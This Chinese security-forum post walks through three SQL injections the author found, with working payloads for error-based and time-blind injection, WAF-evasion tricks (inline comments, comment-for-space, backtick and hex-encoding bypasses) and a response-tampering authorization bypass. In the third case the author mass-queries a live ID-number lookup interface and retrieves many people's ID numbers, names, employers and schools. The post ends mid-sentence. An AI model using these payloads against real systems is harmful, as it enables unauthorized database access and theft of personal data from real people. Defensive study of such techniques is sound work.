---
title: 这个SQL注入有点东西
url: https://forum.butian.net/share/4453
source: 奇安信攻防社区
date: 2025-07-11
fetch_date: 2025-10-06T23:24:30.691424
---

# 这个SQL注入有点东西

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 这个SQL注入有点东西

* [渗透测试](https://forum.butian.net/topic/47)

最近遇到了几个比较有意思的SQL注入，跟各位师傅们分享一下思路和注入方式。

前言
--
SQL注入是渗透中比较常见的漏洞类型，注入方式也是多种多样的，但waf和过滤也是多元的，这次和师傅们分享一下最近遇到的几处SQL注入，分享一下思路和注入方式，如果有理解不正确的地方，求大佬指点。
第一处SQL注入
--------
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-f0fdb16789dbcbf6fdfb273add88981e35c0f92a.png)
是在这里进行查询抓包，然后注入点在日期
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-aa601013b01805abb7743d698a9293c108f5c077.png)
可以发现加入一个单引号之后，返回了报错信息，我们对报错信息进行分析一下：
正常是
`date\_format('2025-06-19 00:00:00','%Y-%m-%d %H:%M:%S')`
然后我们添加一个单引号后变成了
`date\_format('2025-06-19 00:00:00'','%Y-%m-%d %H:%M:%S')`
这时候我们第一步要做的是进行闭合，一开始我这里选择的是插入 \*\*\*')#\*\*\* 进行闭合
于是我构造了
`2025-06-19 00:00:00') and extractvalue(1,concat(0x0a,(select user()),0x0a))#`
但是没成功，后来又想到了date\\_format()是有两个参数的，于是又构造了
`2025-06-19 00:00:00','%Y-%m-%d %H:%M:%S') and extractvalue(1,concat(0x0a,(select user()),0x0a))#`
但还是不对，直接本地调试一下吧
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-2421f26b9beccaef95987d2d99350ff488ac9d97.png)
把完整的语句放进来，然后进行调试，删除不必要的东西。
`#SELECT COUNT(1) FROM ( SELECT ss FROM patrol\_task AS t JOIN sys\_user AS u WHERE date\_format ( t.start\_time,'%Y-%m-%d %H:%M:%S') >= date\_format('2025-06-11 00:00:0011111111111','%Y-%m-%d %H:%M:%S') and extractvalue(0x0a,concat(0x0a,database())))TOTAL# AND date\_format (t.end\_time,'%Y-%m-%d %H:%M:%S') <= date\_format('2025-07-21 23:59:59','%Y-%m-%d %H:%M:%S') ORDER BY t.create\_date DESC ) TOTAL`
最后可以精简到差不多这样，后来经过本地调试之后，发现存在一个问题
`SELECT COUNT(1) FROM ( select username FROM admin AS t JOIN news AS u WHERE 1=1 and extractvalue(0x0a,concat(0x0a,database())))TOTAL#`
这样是可以报错出结果的：
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-bcfeede0c7038a52dd28cdbef0d7178054b8ba69.png)
也就是说，按理说我闭合后拼接
`and extractvalue(0x0a,concat(0x0a,database())))total#`
是可以爆出内容的
但是网站就是无法报错，然后观察网站报错信息，发现并不是数据库的那种报错，感觉是网站框架，自定义的报错，可能压根就不会返回报错信息，于是我们尝试使用时间盲注
正常来说我们闭合之后会拼接`if(ascii(substr(user(),1,1))>1,sleep(6),0)`
我们继续在本地调试：
`select count(1) from (select username from admin as t join news as u where 1=1 and if(ascii(substr(user(),1,1))>1,sleep(6),0))total#`
这是构造完的语句，发现可以延时，但是换到网站中发现并没有达到延时的效果：
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-22246d0de73ce6e75f2024f608c82df68435e2ee.png)
问题出现在条件这里：
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-8841d127d4f833a0d4780571a0ab418d3bdad92c.png)
我们的注入点在这里，注入点是起始时间和终止时间
这个where，后面跟着的这个条件，也就是date\\_format,我们在不知道有没有记录的条件下，是无法保障他是有内容(条件为真)的，就好比1=2一样，这样可能无法执行后面的延迟语句，这就是为什么在本地调试了之后没问题，但是网站还是无法进行延迟的原因。因为我们不清楚前面的判断条件是否为真。
那我们有没有办法，即使前面的条件为假，也可也执行后面的语句呢？
有的兄弟，有的。我们直接使用子查询
这里给各位师傅们再介绍一下子查询：
子查询是在语句中再嵌入一个sql语句，适合从其他表中提取数据或进行复杂条件判断时使用，最内层的语句会被优先执行，会比一些逻辑运算和算数运算的优先级高。
于是我们构造一个时间盲注子查询语句：
`#select count(1) from (select username from admin as t join news as u where 1=2 and (select 0 from (select if(ascii(substr(user(),1,1))>1,sleep(6),1))x))TOTAL#`
我们来解析一下这个语句
最内层是`if(ascii(substr(user(),1,1)>1,sleep(6),1))` 是一个常见的时间盲注，截取了user()的首位，进行了ascii编码，如果ascii编码的值大于1，就进行sleep(6)的命令。
外面一层是`(select 0 from () x)` x是给最内层的语句进行一个赋名
这个语句会让系统优先执行最内层的时间盲注语句，然后判断前面的条件是否为真，这样即使前面是1=2，但是已经执行了内层的时间盲注，造成了延迟，这样就可以进行SQL注入的判断了。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-655ee7abe14093123b712dbf6fb0184efe80ea49.png)
所以最终我们的payload为
`2025-06-19 00:00:00','%Y-%m-%d %H:%M:%S') and (select 0 from (select if(ascii(substr(user(),1,1))>1,sleep(6),1))x))TOTAL#`
达到了一个时间盲注的结果。
第二处SQL注入
--------
这个SQL注入有非常严格的过滤，基本上常见的函数和常见的绕过函数都被过滤的干干净净了。
首先要进行一个权限绕过：
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-00eededfb06a29f4a55ea72a051d8ec206ab657a.png)
有时候直接修改返回包会有意想不到的结果，直接把返回包的false改为true
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-57381ae213dbf4f7e656a0d734edde03d3749897.png)
进来之后，也是一个查询的地方去抓包
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-fb562ffc10c3ba147f029b04f4faa42d7ac5b5f2.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-54b9dcdf6815acfda859739da669705c9a3d6bd9.png)
注入点是ordertype，一个单引号报错，两个单引号正常
但是过滤非常非常严格，常见的几乎没有能用的东西,发现还是时间盲注好用，可以使用benchmark(),话不多说直接上payload，分析一波：
`orderType=1%20or%20Y(point(56.7,53.34))%20or%20(select/\*\*/0/\*\*/from/\*\*/(select/\*\*/if((ascii(right(left(user/\*!55555\*/(),1),1))!=1),(select/\*!55555555555555555\*/benchmark(511111111,1)),1))x)`
首先是`1 or Y(point(56.7,53.34))` 这是使用了mysql的Y()函数去获得了Y的坐标，其实就类似于一个恒真的表达式，起到了一些绕过的作用。
/\\*\\*/ 绕过了空格的过滤
/\\*!55555\\*/ 是mysql的内联注释
left(right())的搭配使用可以绕过一些waf，提高复杂度，防止被识别到
数字55555是一个任意大的版本号，当MySQL服务器版本 ≥ 指定版本号时，执行注释中的代码，由于55555不可能达到，实际上总是执行，所以通过这种方式可以绕过user()的识别。
后面的`select/\\*!55555555555555555\\*/benchmark(511111111,1)`是一个原理，系统监测了select benchmark()，会被拦截，但是使用内联注释之后，就可以绕过识别，从而达到执行语句的结果。
这里依旧是使用了子查询语句，我们分析代码：
`1%20or%20Y(point(56.7,53.34))%20or%20(select/\*\*/0/\*\*/from/\*\*/(select/\*\*/if((ascii(right(left(user/\*!55555\*/(),1),1))!=1),(select/\*!55555555555555555\*/benchmark(511111111,1)),1))x)`
发现使用了两个or，而Y()是恒为真的，但是我们依旧无法判断ordertype=1是否存在，如果不存在的话，那么ordertype=1为假，而Y()为真，我们最后的注入语句就无法实现精准判断，所以我们这里使用子查询语句，就不用考虑ordertype=1的真假性。
系统先执行内层语句，也就是
`select if((ascii(right(left(user/\*!55555\*/(),1),1))!=1),(select/\*!5555555555555555555555\*/benchmark(51111111,1),1))`
`select 0 from () x`
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-f27c90756fbffcb459b0334fe4afe5c5453ef910.png)
达到了一个时间盲注的目的。
第三处SQL注入
--------
这是一个拿身份证查信息的接口，tj是注入点，加一个单引号可以看到进行报错。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-f071900b776d17a707abead3204e5a071796db64.png)
多加几个单引号，分析一下。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-966a79b048281acf2a50a3f6af100bfe0f22547f.png)
可以看到原本的逻辑应该是 sfzh='123123' and xm='12331'，这里的123123是我随便输入的身份证号,12331是我随意输入的姓名。
于是构造闭合，直接让`tj=sfzh=1#`,这样进行闭合，这样就变成了 `sfzh=1 and (注入语句) #` 然后这里and or 被过滤了，我选择使用 || 来代替，发现 `|| 1=1#` 会爆502，而 `|| 1=2#` 会出现内容
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-ff3c188a22f8300cc67e8916a8ecd7f86064a87e.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-2d697d70723a157316a61b40ef47bd6c60f7d77b.png)
然后因为有报错信息，所以尝试报错注入
发现extractvalue()，floor(),updatexml(),exp()什么的都被过滤了，然后使用 ` 反引号绕过。
`extractvalue`(1,`concat`(0x0a,`version`()))#
也就是这样去绕过，concat()也被过滤了，直接也这样绕过。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-14e7c695660e1ba9cbe597dbc506c10e046813d5.png)
成功报错注入了，后来想证明数据库是什么权限的时候，发现user()也被过滤了，但是user()是没有办法使用` 反引号去隔开绕过的，常见的方法也过滤了不少，我这里选择使用current\\_user去替换
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-e22f0f2581673948d2052d362f99fab8f2ecc452.png)
可以看到是成功报错了。
`
因为是使用身份证去查询的接口，想着可以查询一下有没有敏感信息，可以发现现在是已经在sfzh这个表里了，我们去查sfzh这个字段，就相对来说比较容易，我们可以使用like去进行模糊查询，比如 `sfzh like '1%'`
like是一个模糊匹配的作用，而'1%'，是需要用单引号括起来的，我们这样的目的是模糊匹配sfzh这个字段，1开头的信息，也就是查询身份证号是1开头的个人信息。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-f9ea2c97a4aa6885dc8b3d5b95da6df40cb80021.png)
但是并没有如愿的出现内容，观察报错信息，发现单引号被转义了，这里我们使用16进制编码绕过。
'2%'为0x3225
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-cc63a75f513cfc9d621b9e31eb99a83b660d4f74.png)
可以看到匹配到了非常多的信息，身份证、姓名、单位、学校、等数据，然后继续匹配其他身份证开头数字，共计...